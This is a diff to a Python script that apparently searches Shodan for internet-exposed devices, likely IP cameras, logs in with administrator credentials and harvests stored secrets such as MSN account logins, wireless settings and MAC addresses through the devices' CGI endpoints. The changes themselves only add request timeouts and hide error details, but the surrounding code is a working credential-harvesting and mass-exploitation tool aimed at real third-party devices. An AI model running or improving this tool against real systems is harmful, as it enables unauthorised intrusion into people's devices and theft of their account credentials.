@@ -97,6 +97,7 @@ def main() :
   msn_user = ''
   msn_pwd = ''
 
+
   try:
 
    shodanapi = shodan.Shodan(args.address)
@@ -143,7 +144,7 @@ def main() :
 
         headers = {'User-Agent': "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.94 Safari/537.36" }
 
-        request = requests.get(url, auth=(administrator, password), headers=headers)
+        request = requests.get(url, auth=(administrator, password), headers=headers, timeout=0.3)
 
         status = request.status_code
 
@@ -161,7 +162,7 @@ def main() :
 
              headers = {'User-Agent': "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.94 Safari/537.36" }
 
-             request = requests.get(url, headers=headers, auth=(administrator, password))
+             request = requests.get(url, headers=headers, auth=(administrator, password), timeout=0.3)
 
              response = request.text.split(";\n")
 
@@ -212,7 +213,7 @@ def main() :
                  if not(msn_user == '') :
                      print( backgroundColor.OKGREEN + "[+] MSN: %s@%s" % (msn_user, msn_pwd) + backgroundColor.ENDC)
          except Exception as e:
-             print(e)
+             print("Error")
          break
         else:
          found = False
@@ -228,7 +229,7 @@ def main() :
         exploit = True
         print(backgroundColor.FAIL + backgroundColor.BOLD + "[!] Password not found" + backgroundColor.ENDC)
      except Exception as e:
-      print("Error: %s" % (e))
+      print("Error")
 
      print(backgroundColor.WARNING + "[!] Getting System Information" + backgroundColor.ENDC)
      print(backgroundColor.WARNING + "[!] Getting Wireless System Information" +backgroundColor.ENDC)
@@ -238,7 +239,7 @@ def main() :
       wireless = "http://%s:%s/get_status.cgi" % (host, port)
       headers = {'User-Agent': "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.94 Safari/537.36" }
 
-      response = requests.get(wireless, headers=headers)
+      response = requests.get(wireless, headers=headers, timeout=0.3)
       status = response.status_code
       content = response.text.split(';\n')
 
@@ -253,7 +254,7 @@ def main() :
       else:
         print(backgroundColor.FAIL + "[-] Getting mac address" + backgroundColor.ENDC)
      except Exception as e:
-      print("Error : %s" % (e))
+      print("Error")
 
      print("""[+] Host: http://%s:%s\n[+] Country: %s\n[+] City: %s\n[+] Organization: %s\n[+] Product: %s""" % (host, port, country, city, org, product))
 
@@ -265,7 +266,7 @@ def main() :
 
       headers = {'User-Agent': "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.94 Safari/537.36" }
 
-      response = requests.get(url, headers=headers)
+      response = requests.get(url, headers=headers, timeout=0.3)
       content = response.text.split("\n")
 
       status = response.status_code
@@ -341,7 +342,7 @@ def main() :
 def log(host, port, country, city, org, product):
 
  file = open(filename, 'a')
- out = "[+] Host: http://%s:%s\n[+] Country: %s\n[+] City: %s\n[+] Organization: %s\n[+] Product: %s\n" % (host, port, country, city, org, product)
+ out = "[+] Host: http://%s:%s\n[+] Country: %s\n[+] City: %s\n[+] Organization: %s\n[+] Product: %s\n " % (host, port, country, city, org, product)
  file.write(out.encode('utf-8'))
  file.write("*****************" + "\n")
  file.close()
